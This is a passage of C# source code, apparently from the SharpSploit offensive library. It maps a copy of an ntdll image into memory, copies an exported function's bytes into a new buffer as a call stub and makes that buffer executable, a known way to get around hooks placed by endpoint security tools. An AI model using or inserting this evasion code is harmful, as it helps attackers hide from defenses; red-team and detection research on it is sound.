            IntPtr pImage = Native.NtAllocateVirtualMemory((IntPtr)(-1), ref BaseAddress, IntPtr.Zero, ref RegionSize, Execution.Win32.Kernel32.MEM_COMMIT | Execution.Win32.Kernel32.MEM_RESERVE, Execution.Win32.WinNT.PAGE_READWRITE);

            // Write PE header to memory
            UInt32 BytesWritten = Native.NtWriteVirtualMemory((IntPtr)(-1), pImage, ModlePointer, SizeOfHeaders);

            // Write sections to memory
            foreach (PE.IMAGE_SECTION_HEADER ish in PEINFO.Sections)
            {
                // Calculate offsets
                IntPtr pVirtualSectionBase = (IntPtr)((UInt64)pImage + ish.VirtualAddress);
                IntPtr pRawSectionBase = (IntPtr)((UInt64)ModlePointer + ish.PointerToRawData);

                // Write data
                BytesWritten = Native.NtWriteVirtualMemory((IntPtr)(-1), pVirtualSectionBase, pRawSectionBase, ish.SizeOfRawData);
                if (BytesWritten != ish.SizeOfRawData)
                {
                    throw new InvalidOperationException("Failed to write to memory.");
                }
            }

            // Get Ptr to function
            IntPtr pFunc = GetExportAddress(pImage, FunctionName);
            if (pFunc == IntPtr.Zero)
            {
                throw new InvalidOperationException("Failed to resolve ntdll export.");
            }

            // Alloc memory for call stub
            BaseAddress = IntPtr.Zero;
            RegionSize = (IntPtr)0x50;
            IntPtr pCallStub = Native.NtAllocateVirtualMemory((IntPtr)(-1), ref BaseAddress, IntPtr.Zero, ref RegionSize, Execution.Win32.Kernel32.MEM_COMMIT | Execution.Win32.Kernel32.MEM_RESERVE, Execution.Win32.WinNT.PAGE_READWRITE);

            // Write call stub
            BytesWritten = Native.NtWriteVirtualMemory((IntPtr)(-1), pCallStub, pFunc, 0x50);
            if (BytesWritten != 0x50)
            {
                throw new InvalidOperationException("Failed to write to memory.");
            }

            // Change call stub permissions
            Native.NtProtectVirtualMemory((IntPtr)(-1), ref pCallStub, ref RegionSize, Execution.Win32.WinNT.PAGE_EXECUTE_READ);

            // Free temporary allocations
            Marshal.FreeHGlobal(ModlePointer);
            if (PEINFO.Is32Bit)
            {
                RegionSize = (IntPtr)PEINFO.OptHeader32.SizeOfImage;
            }
            else
            {
                RegionSize = (IntPtr)PEINFO.OptHeader64.SizeOfImage;
            }

            Native.NtFreeVirtualMemory((IntPtr)(-1), ref pImage, ref RegionSize, SharpSploit.Execution.Win32.Kernel32.MEM_RELEASE);

            return pCallStub;
        }
    }
}
